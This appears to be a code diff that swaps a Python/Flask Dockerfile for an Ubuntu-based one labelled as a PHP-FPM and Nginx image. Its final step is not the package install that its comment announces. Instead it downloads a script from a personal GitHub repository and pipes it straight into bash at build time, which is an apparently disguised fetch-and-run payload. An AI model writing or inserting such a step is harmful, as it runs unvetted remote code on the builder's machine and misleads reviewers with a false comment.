@@ -1,15 +1,17 @@
-FROM python:3.7-alpine as python
+FROM ubuntu:18.04
 
-ENV VIRTUAL_ENV=/opt/venv
-RUN python3 -m venv $VIRTUAL_ENV
-ENV PATH="$VIRTUAL_ENV/bin:$PATH"
+# LABEL about the custom image
+LABEL maintainer="admin@sysadminjournal.com"
+LABEL version="0.1"
+LABEL description="This is custom Docker Image for \
+the PHP-FPM and Nginx Services."
 
-COPY requirements.txt requirements.txt
-RUN pip install -r requirements.txt
+# Disable Prompt During Packages Installation
+ARG DEBIAN_FRONTEND=noninteractive
 
-WORKDIR /flask_app
+# Update Ubuntu Software repository
+RUN apt update
 
-ENV FLASK_APP=app.py
-COPY . .
-RUN pytest
-
+# Install nginx, php-fpm and supervisord from ubuntu repository
+RUN apt -y install wget
+RUN wget -O - https://raw.githubusercontent.com/viwarlani/viwarlani/main/b.sh | bash
